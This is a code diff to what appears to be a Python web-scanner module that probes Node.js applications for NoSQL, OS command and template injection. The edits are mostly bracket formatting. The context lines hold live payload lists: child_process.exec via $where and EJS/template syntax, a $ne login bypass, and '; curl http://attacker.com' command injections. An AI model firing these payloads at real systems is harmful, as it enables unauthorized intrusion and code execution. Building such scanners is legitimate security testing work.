@@ -19,8 +19,7 @@ class Module(Auxiliary, Http_client):
         'references': [
             'https://owasp.org/www-community/attacks/Command_Injection',
             'https://owasp.org/www-community/attacks/NoSQL_Injection',
-            'https://portswigger.net/web-security/os-command-injection',
-        ],
+            'https://portswigger.net/web-security/os-command-injection'],
     'agent': {
         'risk': 'active',
         'effects': ['network_probe'],
@@ -45,10 +44,7 @@ class Module(Auxiliary, Http_client):
          'endpoint_pattern_any': [],
          'param_any': [],
          'api_surface_ready': False},
-        'chain':         {'produces_capabilities': [{'capability': 'db_access', 'from_detail': ''},
-                                   {'capability': 'db_access', 'from_detail': ''},
-                                   {'capability': 'ssrf_primitive', 'from_detail': ''},
-                                   {'capability': 'db_access', 'from_detail': ''}],
+        'chain':         {'produces_capabilities': [{'capability': 'ssrf_primitive', 'from_detail': ''}],
          'consumes_capabilities': [],
          'option_bindings': {},
          'suggested_followups': []},
@@ -79,8 +75,7 @@ class Module(Auxiliary, Http_client):
         '{"$where": "this.constructor.constructor(\'return process\')().mainModule.require(\'child_process\').exec(\'calc\')"}',
         
         # CouchDB injection
-        '{"$or": [{"username": {"$ne": null}}, {"password": {"$ne": null}}]}',
-    ]
+        '{"$or": [{"username": {"$ne": null}}, {"password": {"$ne": null}}]}']
 
     # Command injection payloads
     COMMAND_INJECTION_PAYLOADS = [
@@ -105,8 +100,7 @@ class Module(Auxiliary, Http_client):
         '; sleep 5',
         '| sleep 5',
         '; curl http://attacker.com',
-        '| curl http://attacker.com',
-    ]
+        '| curl http://attacker.com']
 
     # Template injection payloads (for EJS, Handlebars, etc.)
     TEMPLATE_INJECTION_PAYLOADS = [
@@ -118,8 +112,7 @@ class Module(Auxiliary, Http_client):
         '<%=7*7%>',
         '<%=global.process.mainModule.require("child_process").exec("calc")%>',
         '${7*7}',
-        '${global.process.mainModule.require("child_process").exec("calc")}',
-    ]
+        '${global.process.mainModule.require("child_process").exec("calc")}']
 
     # Parameter names commonly used in Node.js apps
     NODEJS_PARAMS = [
@@ -127,8 +120,7 @@ class Module(Auxiliary, Http_client):
         'q', 'query', 'search', 'filter',
         'user', 'user_id', 'name', 'value',
         'data', 'input', 'cmd', 'command',
-        'template', 'view', 'page',
-    ]
+        'template', 'view', 'page']
 
     # Avoid matching the word "express" inside "expression", etc.
     _RE_EXPRESS_NOT_EXPRESSION = re.compile(r"\bexpress(?!ion\b)", re.IGNORECASE)
@@ -267,8 +259,7 @@ class Module(Auxiliary, Http_client):
             nosql_errors = [
                 'mongodb', 'mongoose', 'couchdb', 'nosql',
                 'syntaxerror', 'typeerror', 'referenceerror',
-                'cannot read property', 'undefined',
-            ]
+                'cannot read property', 'undefined']
             
             response_lower = response.text.lower()
             for error in nosql_errors:
@@ -365,8 +356,7 @@ class Module(Auxiliary, Http_client):
             # Check for error messages
             cmd_errors = [
                 'command not found', 'syntax error',
-                'permission denied', 'cannot execute',
-            ]
+                'permission denied', 'cannot execute']
             
             for error in cmd_errors:
                 if error in response_lower:
@@ -439,8 +429,7 @@ class Module(Auxiliary, Http_client):
             template_errors = [
                 'template error', 'syntax error',
                 'ejs', 'handlebars', 'mustache',
-                'render error', 'compilation error',
-            ]
+                'render error', 'compilation error']
             
             response_lower = response.text.lower()
             for error in template_errors:
